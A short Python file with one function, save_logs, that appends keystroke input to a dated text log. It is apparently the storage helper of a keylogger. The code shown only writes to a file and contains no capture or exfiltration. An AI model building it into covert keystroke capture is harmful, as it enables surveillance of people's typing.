from textwrap import TextWrapper
from datetime import datetime

def save_logs(key_input):
    """ This function writes and saves key strokes in a text file. """
    
    text_wrap = TextWrapper(width=10)
    
    with open('logs.txt', 'a+') as logfile:
        with open('logs.txt', 'r') as f:
            if str(datetime.now().strftime("%a %d-%m-%Y")) not in f.read():
                print('==='*30, file=logfile)
                print(f'New log file - {datetime.now().strftime("%a %d-%m-%Y, %H:%M:%S")}', file=logfile)
                print('==='*30, file=logfile)
                print('\n', file=logfile)

        logfile.write(text_wrap.fill(key_input))
